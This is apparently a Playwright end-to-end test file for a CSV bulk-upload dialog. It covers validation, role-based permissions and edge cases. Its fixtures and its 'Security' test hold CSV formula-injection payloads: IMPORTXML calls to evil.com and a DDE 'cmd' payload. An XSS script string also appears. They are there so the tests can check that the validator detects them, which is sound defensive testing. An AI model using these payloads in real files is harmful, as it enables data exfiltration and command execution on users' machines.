/**
 * E2E Tests for Bulk CSV Upload Flow
 * @file __tests__/e2e/bulk-upload.spec.ts
 */

import { test, expect } from '@playwright/test'
import path from 'path'

// Test data
const VALID_CSV = `origin,tenant,display_name,priority_level,tags,notes
https://test-dealer-1.com,test-tenant,Test Dealer 1,high,"auto,dealer",Test note 1
test-dealer-2.com,test-tenant,Test Dealer 2,medium,"car,sales",Test note 2
https://test-dealer-3.com,test-tenant,Test Dealer 3,low,"automotive",Test note 3`

const INVALID_CSV = `origin,tenant,display_name
invalid-url,test-tenant,Bad URL
=IMPORTXML("http://evil.com"),test-tenant,Excel Injection
<script>alert(1)</script>.com,test-tenant,XSS Attempt`

const MIXED_CSV = `origin,tenant,display_name,priority_level
https://valid-1.com,test-tenant,Valid One,high
invalid-domain,test-tenant,Invalid One,medium
https://valid-2.com,test-tenant,Valid Two,low`

/**
 * Helper: Create temporary CSV file
 */
async function createCSVFile(content: string, filename: string): Promise<string> {
  const fs = require('fs')
  const tmpDir = path.join(__dirname, '../../tmp')

  if (!fs.existsSync(tmpDir)) {
    fs.mkdirSync(tmpDir, { recursive: true })
  }

  const filePath = path.join(tmpDir, filename)
  fs.writeFileSync(filePath, content)
  return filePath
}

/**
 * Helper: Mock authentication
 */
async function mockAuth(page: any, role: string = 'admin') {
  const token = Buffer.from(JSON.stringify({
    tenant_id: 'test-tenant-id',
    user_id: 'test-user-id',
    role: role,
    permissions: ['origins:read', 'origins:bulk_upload']
  })).toString('base64')

  await page.evaluate((token) => {
    localStorage.setItem('auth_token', token)
  }, token)
}

test.describe('Bulk CSV Upload', () => {
  test.beforeEach(async ({ page }) => {
    // Navigate to fleet page
    await page.goto('/fleet')

    // Mock authentication
    await mockAuth(page, 'admin')
  })

  test('should open upload dialog when clicking upload button', async ({ page }) => {
    // Click bulk upload button
    await page.click('button:has-text("Bulk Upload")')

    // Verify dialog is visible
    await expect(page.locator('text=Bulk Upload Origins')).toBeVisible()
    await expect(page.locator('text=Drop CSV file here')).toBeVisible()
  })

  test('should show template download option', async ({ page }) => {
    await page.click('button:has-text("Bulk Upload")')

    // Verify template section is visible
    await expect(page.locator('text=Need a template?')).toBeVisible()
    await expect(page.locator('button:has-text("Download Template")')).toBeVisible()
  })

  test('should upload valid CSV and show preview', async ({ page }) => {
    const csvPath = await createCSVFile(VALID_CSV, 'valid-origins.csv')

    await page.click('button:has-text("Bulk Upload")')

    // Upload file
    const fileInput = page.locator('input[type="file"]')
    await fileInput.setInputFiles(csvPath)

    // Wait for preview to load
    await page.waitForSelector('text=Preview', { timeout: 10000 })

    // Verify counts
    await expect(page.locator('text=Total Rows')).toBeVisible()
    await expect(page.locator('text=Valid')).toBeVisible()

    // Verify preview table shows data
    await expect(page.locator('text=test-dealer-1.com')).toBeVisible()
    await expect(page.locator('text=Test Dealer 1')).toBeVisible()
  })

  test('should detect validation errors in CSV', async ({ page }) => {
    const csvPath = await createCSVFile(INVALID_CSV, 'invalid-origins.csv')

    await page.click('button:has-text("Bulk Upload")')

    // Upload file
    const fileInput = page.locator('input[type="file"]')
    await fileInput.setInputFiles(csvPath)

    // Wait for preview
    await page.waitForSelector('text=Validation Errors', { timeout: 10000 })

    // Verify error section is visible
    await expect(page.locator('text=Invalid')).toBeVisible()

    // Check for specific errors
    await expect(page.locator('text=Invalid domain format')).toBeVisible()
  })

  test('should handle mixed valid/invalid rows correctly', async ({ page }) => {
    const csvPath = await createCSVFile(MIXED_CSV, 'mixed-origins.csv')

    await page.click('button:has-text("Bulk Upload")')

    const fileInput = page.locator('input[type="file"]')
    await fileInput.setInputFiles(csvPath)

    await page.waitForSelector('text=Preview', { timeout: 10000 })

    // Verify valid rows shown
    await expect(page.locator('text=valid-1.com')).toBeVisible()
    await expect(page.locator('text=valid-2.com')).toBeVisible()

    // Verify invalid count
    await expect(page.locator('text=1').first()).toBeVisible() // 1 invalid
  })

  test('should allow committing valid origins', async ({ page }) => {
    const csvPath = await createCSVFile(VALID_CSV, 'commit-origins.csv')

    // Mock successful API responses
    await page.route('**/api/origins/bulk-csv', async (route) => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          ok: true,
          preview: [
            { origin: 'https://test-dealer-1.com', tenant: 'test-tenant', checksum: 'abc123' },
            { origin: 'https://test-dealer-2.com', tenant: 'test-tenant', checksum: 'def456' }
          ],
          counts: { parsed: 3, valid: 3, invalid: 0, duplicates: 0 },
          invalid: [],
          uploadId: 'test-upload-id',
          fileChecksum: 'file-checksum-123'
        })
      })
    })

    await page.route('**/api/origins/bulk-csv/commit', async (route) => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          ok: true,
          batchId: 'test-batch-id',
          results: { inserted: 3, updated: 0, failed: 0, errors: [] }
        })
      })
    })

    await page.click('button:has-text("Bulk Upload")')

    const fileInput = page.locator('input[type="file"]')
    await fileInput.setInputFiles(csvPath)

    await page.waitForSelector('button:has-text("Commit")', { timeout: 10000 })

    // Click commit button
    await page.click('button:has-text("Commit")')

    // Wait for success message
    await page.waitForSelector('text=Upload Complete', { timeout: 10000 })
    await expect(page.locator('text=successfully imported')).toBeVisible()
  })

  test('should close dialog on cancel', async ({ page }) => {
    await page.click('button:has-text("Bulk Upload")')

    await expect(page.locator('text=Bulk Upload Origins')).toBeVisible()

    // Click cancel
    await page.click('button:has-text("Cancel")')

    // Verify dialog is closed
    await expect(page.locator('text=Bulk Upload Origins')).not.toBeVisible()
  })

  test('should allow retry after error', async ({ page }) => {
    const csvPath = await createCSVFile(VALID_CSV, 'error-origins.csv')

    // Mock API error
    await page.route('**/api/origins/bulk-csv', async (route) => {
      await route.fulfill({
        status: 500,
        contentType: 'application/json',
        body: JSON.stringify({
          ok: false,
          error: 'Internal server error'
        })
      })
    })

    await page.click('button:has-text("Bulk Upload")')

    const fileInput = page.locator('input[type="file"]')
    await fileInput.setInputFiles(csvPath)

    // Wait for error state
    await page.waitForSelector('text=Upload Failed', { timeout: 10000 })
    await expect(page.locator('text=Internal server error')).toBeVisible()

    // Verify retry button exists
    await expect(page.locator('button:has-text("Try Again")')).toBeVisible()
  })
})

test.describe('RBAC Enforcement', () => {
  test('should block upload for viewer role', async ({ page }) => {
    await page.goto('/fleet')
    await mockAuth(page, 'viewer')

    const csvPath = await createCSVFile(VALID_CSV, 'viewer-origins.csv')

    // Mock 403 response
    await page.route('**/api/origins/bulk-csv', async (route) => {
      await route.fulfill({
        status: 403,
        contentType: 'application/json',
        body: JSON.stringify({
          ok: false,
          error: 'Missing permission: origins:bulk_upload'
        })
      })
    })

    await page.click('button:has-text("Bulk Upload")')

    const fileInput = page.locator('input[type="file"]')
    await fileInput.setInputFiles(csvPath)

    // Verify error message about permissions
    await page.waitForSelector('text=Missing permission', { timeout: 10000 })
  })

  test('should enforce file size limits based on role', async ({ page }) => {
    await page.goto('/fleet')
    await mockAuth(page, 'editor') // Editor has 10MB limit

    // Mock large file response
    await page.route('**/api/origins/bulk-csv', async (route) => {
      await route.fulfill({
        status: 413,
        contentType: 'application/json',
        body: JSON.stringify({
          ok: false,
          error: 'File size 15MB exceeds limit of 10MB for role editor'
        })
      })
    })

    await page.click('button:has-text("Bulk Upload")')

    // Note: Hard to test actual large file in E2E, so we mock the response
    const csvPath = await createCSVFile(VALID_CSV, 'large-file.csv')
    const fileInput = page.locator('input[type="file"]')
    await fileInput.setInputFiles(csvPath)

    // Verify size limit error
    await page.waitForSelector('text=exceeds limit', { timeout: 10000 })
  })
})

test.describe('Security', () => {
  test('should detect Excel injection attempts', async ({ page }) => {
    const maliciousCSV = `origin,tenant
=IMPORTXML("http://evil.com/data"),test-tenant
+cmd|'/c calc'!A1,test-tenant`

    const csvPath = await createCSVFile(maliciousCSV, 'excel-injection.csv')

    await page.goto('/fleet')
    await mockAuth(page, 'admin')

    await page.click('button:has-text("Bulk Upload")')

    const fileInput = page.locator('input[type="file"]')
    await fileInput.setInputFiles(csvPath)

    await page.waitForSelector('text=Validation Errors', { timeout: 10000 })

    // Verify injection detection
    await expect(page.locator('text=Excel injection')).toBeVisible()
  })

  test('should require authentication', async ({ page }) => {
    // Clear auth
    await page.evaluate(() => {
      localStorage.removeItem('auth_token')
    })

    // Mock 401 response
    await page.route('**/api/origins/bulk-csv', async (route) => {
      await route.fulfill({
        status: 401,
        contentType: 'application/json',
        body: JSON.stringify({
          error: 'Unauthorized',
          message: 'Authentication required'
        })
      })
    })

    await page.goto('/fleet')

    const csvPath = await createCSVFile(VALID_CSV, 'auth-test.csv')

    await page.click('button:has-text("Bulk Upload")')

    const fileInput = page.locator('input[type="file"]')
    await fileInput.setInputFiles(csvPath)

    // Verify auth error
    await page.waitForSelector('text=Authentication required', { timeout: 10000 })
  })
})

test.describe('Edge Cases', () => {
  test('should handle empty CSV file', async ({ page }) => {
    const emptyCSV = `origin,tenant`
    const csvPath = await createCSVFile(emptyCSV, 'empty.csv')

    await page.goto('/fleet')
    await mockAuth(page, 'admin')

    await page.click('button:has-text("Bulk Upload")')

    const fileInput = page.locator('input[type="file"]')
    await fileInput.setInputFiles(csvPath)

    await page.waitForSelector('text=No rows', { timeout: 10000 })
  })

  test('should handle CSV with only header', async ({ page }) => {
    const headerOnlyCSV = `origin,tenant,display_name`
    const csvPath = await createCSVFile(headerOnlyCSV, 'header-only.csv')

    await page.goto('/fleet')
    await mockAuth(page, 'admin')

    await page.click('button:has-text("Bulk Upload")')

    const fileInput = page.locator('input[type="file"]')
    await fileInput.setInputFiles(csvPath)

    await page.waitForSelector('text=No rows', { timeout: 10000 })
  })

  test('should deduplicate within CSV', async ({ page }) => {
    const duplicateCSV = `origin,tenant
https://same-dealer.com,test-tenant
https://same-dealer.com,test-tenant
https://same-dealer.com,test-tenant
https://different-dealer.com,test-tenant`

    const csvPath = await createCSVFile(duplicateCSV, 'duplicates.csv')

    await page.goto('/fleet')
    await mockAuth(page, 'admin')

    // Mock response with duplicate count
    await page.route('**/api/origins/bulk-csv', async (route) => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          ok: true,
          preview: [
            { origin: 'https://same-dealer.com', tenant: 'test-tenant', checksum: 'abc' },
            { origin: 'https://different-dealer.com', tenant: 'test-tenant', checksum: 'def' }
          ],
          counts: { parsed: 4, valid: 2, invalid: 0, duplicates: 2 },
          invalid: [],
          uploadId: 'test-id',
          fileChecksum: 'checksum'
        })
      })
    })

    await page.click('button:has-text("Bulk Upload")')

    const fileInput = page.locator('input[type="file"]')
    await fileInput.setInputFiles(csvPath)

    await page.waitForSelector('text=Duplicates', { timeout: 10000 })

    // Verify duplicate count shown
    await expect(page.locator('text=2').nth(3)).toBeVisible() // 4th card is duplicates
  })
})
